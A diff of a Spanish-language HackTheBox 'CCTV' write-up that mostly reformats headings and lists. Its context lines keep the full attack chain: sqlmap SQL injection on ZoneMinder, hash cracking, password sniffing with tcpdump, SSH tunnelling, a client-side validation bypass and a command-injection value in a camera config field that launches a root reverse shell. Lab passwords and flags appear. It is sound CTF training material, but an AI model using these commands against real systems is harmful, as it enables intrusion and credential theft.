@@ -22,13 +22,15 @@ layout:
 
 # CCTV HackTheBox (Easy)
 
-# Contexto de la maquina
+## CCTV HackTheBox (Easy)
 
-## Trayectoria CCTV
+## Contexto de la maquina
+
+### Trayectoria CCTV
 
 <figure><img src="../../.gitbook/assets/trayectoria_cctv.png" alt=""><figcaption></figcaption></figure>
 
-## Descripción
+### Descripción
 
 La máquina **CCTV** presenta un entorno Linux orientado a la gestión de cámaras de vigilancia. El sistema expone una aplicación web que integra software de monitorización de vídeo y diversos servicios internos asociados al almacenamiento y administración de eventos de cámaras.
 
@@ -38,37 +40,42 @@ Durante el proceso de explotación se identifican múltiples fallos de seguridad
 
 El objetivo consiste en comprometer completamente el sistema obteniendo:
 
-- Acceso inicial al servidor
-- Escalada lateral entre usuarios
-- Acceso final al usuario **root**
-- Obtención de las flags del sistema
+* Acceso inicial al servidor
+* Escalada lateral entre usuarios
+* Acceso final al usuario **root**
+* Obtención de las flags del sistema
 
 **Tipo de máquina**
 
-- Linux
-- Web Application
-- Network Monitoring / CCTV infrastructure
+* Linux
+* Web Application
+* Network Monitoring / CCTV infrastructure
 
 **Habilidades y técnicas evaluadas**
 
-- Enumeración de servicios con **Nmap**
-- Identificación de credenciales por defecto
-- Explotación de **SQL Injection**
-- Extracción de información con **sqlmap**
-- Cracking de hashes **bcrypt**
-- Escalada mediante **Linux capabilities**
-- Captura de tráfico interno con **tcpdump**
-- Pivoting y **port forwarding con SSH**
-- Explotación de **RCE en software de videovigilancia**
-## Análisis de vulnerabilidades
+* Enumeración de servicios con **Nmap**
+* Identificación de credenciales por defecto
+* Explotación de **SQL Injection**
+* Extracción de información con **sqlmap**
+* Cracking de hashes **bcrypt**
+* Escalada mediante **Linux capabilities**
+* Captura de tráfico interno con **tcpdump**
+* Pivoting y **port forwarding con SSH**
+* Explotación de **RCE en software de videovigilancia**
+
+### Análisis de vulnerabilidades
 
 <figure><img src="../../.gitbook/assets/vuln1_cctv.png" alt=""><figcaption></figcaption></figure>
-<figure><img src="../../.gitbook/assets/vuln2_cctv 1.png" alt=""><figcaption></figcaption></figure>
-<figure><img src="../../.gitbook/assets/vuln3_cctv 1.png" alt=""><figcaption></figcaption></figure>
-<figure><img src="../../.gitbook/assets/vuln4_cctv 1.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/vuln2_cctv.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/vuln3_cctv.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/vuln4_cctv.png" alt=""><figcaption></figcaption></figure>
+
 <figure><img src="../../.gitbook/assets/vuln5_cctv.png" alt=""><figcaption></figcaption></figure>
 
-# Escaneo de puertos
+## Escaneo de puertos
 
 Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina objetivo.
 
@@ -103,8 +110,8 @@ Nmap done: 1 IP address (1 host up) scanned in 40.28 seconds
 
 Observamos que únicamente hay **dos puertos abiertos**:
 
-- **22 → SSH**
-- **80 → HTTP**
+* **22 → SSH**
+* **80 → HTTP**
 
 El puerto que más nos interesa inicialmente es el **puerto 80**, ya que el servicio web está realizando una **redirección hacia el dominio `cctv.htb`**.
 
@@ -131,7 +138,7 @@ Observamos una página web aparentemente normal relacionada con **sistemas de vi
 
 Sin embargo, si nos fijamos en el botón **"Staff Logins"**, veremos que nos redirige a un panel de autenticación.
 
-<figure><img src="../../.gitbook/assets/vuln1Card_cctv 1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/vuln1Card_cctv.png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260309094750.png" alt=""><figcaption></figcaption></figure>
 
@@ -167,17 +174,19 @@ ZoneMinder 1.37.63
 
 Con esta información, procedemos a buscar **vulnerabilidades específicas para esta versión**.
 
----
+***
 
 Después de un tiempo, si volvemos a recargar la página veremos que el panel termina de cargar toda la información correctamente.
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260309111358.png" alt=""><figcaption></figcaption></figure>
 
----
-# Escalate user mark
-## CVE-2024-51482
+***
 
-<figure><img src="../../.gitbook/assets/vuln2Card_cctv 1.png" alt=""><figcaption></figcaption></figure>
+## Escalate user mark
+
+### CVE-2024-51482
+
+<figure><img src="../../.gitbook/assets/vuln2Card_cctv.png" alt=""><figcaption></figcaption></figure>
 
 Tras investigar vulnerabilidades asociadas a la versión identificada, encontramos un **CVE interesante**:
 
@@ -201,7 +210,7 @@ Primero vamos a comprobar si el objetivo es vulnerable.
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=<COOKIE>" -p tid --dbms=mysql --batch
 ```
 
----
+***
 
 > Cookie necesaria
 
@@ -211,9 +220,9 @@ Esta cookie puede obtenerse inspeccionando el almacenamiento del navegador.
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260309101031.png" alt=""><figcaption></figcaption></figure>
 
-Sabiendo eso, nos copiamos la que pone ``ZMSESSID`` y lo pegamos en la terminal donde pone ``<COOKIE>``.
+Sabiendo eso, nos copiamos la que pone `ZMSESSID` y lo pegamos en la terminal donde pone `<COOKIE>`.
 
----
+***
 
 Respuesta:
 
@@ -330,9 +339,9 @@ available databases [3]:
 
 Observamos tres bases de datos:
 
-- `information_schema`
-- `performance_schema`
-- `zm`
+* `information_schema`
+* `performance_schema`
+* `zm`
 
 Las dos primeras son bases de datos **propias de MySQL**, por lo que la que realmente nos interesa es:
 
@@ -578,7 +587,7 @@ Table: Users
 
 Hemos conseguido extraer **tres usuarios registrados en el sistema**.
 
----
+***
 
 > NOTA:
 
@@ -586,7 +595,7 @@ En este caso he utilizado este proceso de enumeración más largo para **analiza
 
 Sin embargo, el repositorio del PoC mencionado anteriormente ya indica directamente **qué tablas y datos son relevantes**, por lo que el proceso también podría realizarse de forma más directa.
 
----
+***
 
 Ahora vamos a intentar obtener el **hash de la contraseña del usuario `mark`**, ya que es el que más nos interesa en este contexto.
 
@@ -649,7 +658,8 @@ Table: Users
 ```
 
 Ahora que hemos obtenido el hash de la contraseña del usuario `mark`, el siguiente paso será intentar **crackearlo mediante fuerza bruta o diccionario** para recuperar la contraseña en texto plano.
-## Crack hash
+
+### Crack hash
 
 > hash
 
@@ -678,7 +688,8 @@ Session completed.
 ```
 
 Tras finalizar el proceso, vemos que **John the Ripper ha logrado recuperar la contraseña en texto plano**.
-## SSH (mark)
+
+### SSH (mark)
 
 Intentamos autenticarnos utilizando el usuario `mark`.
 
@@ -686,7 +697,7 @@ Intentamos autenticarnos utilizando el usuario `mark`.
 ssh mark@<IP>
 ```
 
-Metemos como contraseña ``opensesame``...
+Metemos como contraseña `opensesame`...
 
 ```
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
@@ -726,9 +737,10 @@ mark
 ```
 
 Esto confirma que **las credenciales eran válidas también para el acceso por SSH**, por lo que hemos conseguido una **shell en el sistema como el usuario `mark`**.
-# Escalate user sa_mark
 
-<figure><img src="../../.gitbook/assets/vuln3Card_cctv 1.png" alt=""><figcaption></figcaption></figure>
+## Escalate user sa\_mark
+
+<figure><img src="../../.gitbook/assets/vuln3Card_cctv.png" alt=""><figcaption></figcaption></figure>
 
 Una vez dentro del sistema, comenzamos con la **fase de enumeración local**.
 
@@ -739,7 +751,8 @@ sa_mark
 ```
 
 Esto nos da una pista bastante clara de que probablemente necesitaremos **escalar privilegios hacia dicho usuario**, por lo que continuamos enumerando el sistema en busca de posibles vectores de escalada.
-## Enumeración de capabilities
+
+### Enumeración de capabilities
 
 Una buena práctica durante la enumeración es revisar las **Linux capabilities** asignadas a los binarios del sistema.
 
@@ -773,7 +786,8 @@ cap_net_raw
 ```
 
 Esto significa que podemos **capturar tráfico de red sin necesidad de privilegios de root**, lo cual puede ser útil para interceptar información sensible que circule por la red interna.
-## Interfaces de red
+
+### Interfaces de red
 
 Antes de comenzar a capturar tráfico, vamos a revisar las interfaces de red disponibles en el sistema.
 
@@ -816,7 +830,8 @@ docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
 Observamos varias **interfaces de red internas**, muchas de ellas relacionadas con contenedores o redes virtuales.
 
 Dado que podemos utilizar `tcpdump` sin privilegios elevados, vamos a intentar **capturar tráfico en estas interfaces** para ver si conseguimos identificar información sensible.
-## Análisis de logs
+
+### Análisis de logs
 
 Antes de capturar tráfico, revisamos algunos directorios del sistema en busca de información relevante.
 
@@ -846,7 +861,8 @@ Authorization as sa_mark successful. Command issued: status. Outcome: success. 2
 Esto nos indica que el usuario `sa_mark` está ejecutando comandos en el sistema a través de algún tipo de servicio o aplicación.
 
 Por lo tanto, es posible que dichas credenciales **se estén transmitiendo por la red interna**, lo que abre la posibilidad de interceptarlas mediante captura de tráfico.
-## Captura de tráfico
+
+### Captura de tráfico
 
 Probamos a capturar tráfico en la interfaz:
 
@@ -884,7 +900,7 @@ Ahora intentamos cambiar al usuario `sa_mark`.
 su sa_mark
 ```
 
-Metemos como contraseña ``X1l9fx1ZjS7RZb``...
+Metemos como contraseña `X1l9fx1ZjS7RZb`...
 
 ```
 $ whoami
@@ -913,7 +929,8 @@ Finalmente, leemos la flag correspondiente al usuario:
 ```
 227df626e505602d760f34622cc75900
 ```
-# Escalate Privileges
+
+## Escalate Privileges
 
 <figure><img src="../../.gitbook/assets/vuln4Card_cctv.png" alt=""><figcaption></figcaption></figure>
 
@@ -927,8 +944,7 @@ Si abrimos el documento, observaremos que contiene un aviso interno donde se men
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260309122720.png" alt=""><figcaption></figcaption></figure>
 
-Esto nos da una pista clara de que podría existir reutilización de contraseñas entre distintos servicios del sistema.
-Enumeración de puertos locales
+Esto nos da una pista clara de que podría existir reutilización de contraseñas entre distintos servicios del sistema. Enumeración de puertos locales
 
 A continuación revisamos los servicios que están escuchando en el sistema.
 
@@ -987,7 +1003,8 @@ var adminUsername = 'admin';
 ```
 
 Esto nos indica que el usuario administrador del sistema es `admin`, aunque todavía desconocemos su contraseña.
-## Port Forwarding
+
+### Port Forwarding
 
 Dado que el servicio únicamente escucha en `localhost`, vamos a realizar un **túnel SSH (port forwarding)** para poder acceder a este servicio desde nuestra máquina atacante.
 
@@ -995,7 +1012,7 @@ Dado que el servicio únicamente escucha en `localhost`, vamos a realizar un **t
 ssh sa_mark@<IP> -L 8765:127.0.0.1:8765
 ```
 
-Metemos como contraseña ``X1l9fx1ZjS7RZb``...
+Metemos como contraseña `X1l9fx1ZjS7RZb`...
 
 ```
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
@@ -1048,7 +1065,8 @@ Respuesta:
 <figure><img src="../../.gitbook/assets/Pasted image 20260309123714.png" alt=""><figcaption></figcaption></figure>
 
 Observamos que la página se carga correctamente, lo que confirma que el **túnel SSH se ha establecido de forma exitosa**.
-## Acceso al panel
+
+### Acceso al panel
 
 Ahora intentamos autenticarnos utilizando el usuario `admin`.
 
@@ -1069,7 +1087,7 @@ Una vez dentro del panel, podemos inspeccionar la configuración del sistema y o
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260309125737.png" alt=""><figcaption></figcaption></figure>
 
-## CVE-2025-60787
+### CVE-2025-60787
 
 <figure><img src="../../.gitbook/assets/vuln5Card_cctv.png" alt=""><figcaption></figcaption></figure>
 
@@ -1096,7 +1114,8 @@ RCE via unsanitized motion config parameter
 ```
 
 En la misma página se muestra un ejemplo de cómo explotar la vulnerabilidad.
-## Creación de una cámara
+
+### Creación de una cámara
 
 Para comenzar con la explotación, primero debemos **añadir una nueva cámara** dentro de la interfaz.
 
@@ -1124,7 +1143,7 @@ Posteriormente rellenamos los campos necesarios. En mi caso utilicé **la misma 
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260309130416.png" alt=""><figcaption></figcaption></figure>
 
-## Inyección de comando
+### Inyección de comando
 
 Una vez creada la cámara, accedemos a su configuración y bajamos hasta la sección:
 
@@ -1162,7 +1181,8 @@ function configUiValid() {
   return valid;
 }
 ```
-## Bypass de la validación
+
+### Bypass de la validación
 
 Para evitar esta validación podemos modificar temporalmente la función desde la consola del navegador.
 
@@ -1177,7 +1197,8 @@ Respuesta:
 <figure><img src="../../.gitbook/assets/Pasted image 20260309131237.png" alt=""><figcaption></figcaption></figure>
 
 Esto fuerza a que la función siempre devuelva `true`, permitiéndonos **evitar la validación del formulario**.
-## Activación del payload
+
+### Activación del payload
 
 Ahora configuramos el intervalo de captura en la sección **Still Images** a:
 
@@ -1202,7 +1223,8 @@ Respuesta:
 ```
 
 Esto confirma que el comando se ha ejecutado correctamente **como el usuario `root`**.
-## Reverse Shell
+
+### Reverse Shell
 
 Ahora que sabemos que podemos ejecutar comandos como `root`, vamos a crear una **reverse shell**.
 
@@ -1225,7 +1247,8 @@ Posteriormente modificamos el parámetro **Image File Name** con el siguiente pa
 ```
 $(bash /tmp/rev.sh).%Y-%m-%d-%H-%M-%S
 ```
-## Recepción de la shell
+
+### Recepción de la shell
 
 Nos ponemos a la escucha en nuestra máquina atacante:
 
@@ -1252,4 +1275,3 @@ Esto confirma que hemos conseguido **ejecución remota de comandos como `root`**
 ```
 82756242cad54f0341fc681331f59926
 ```
-
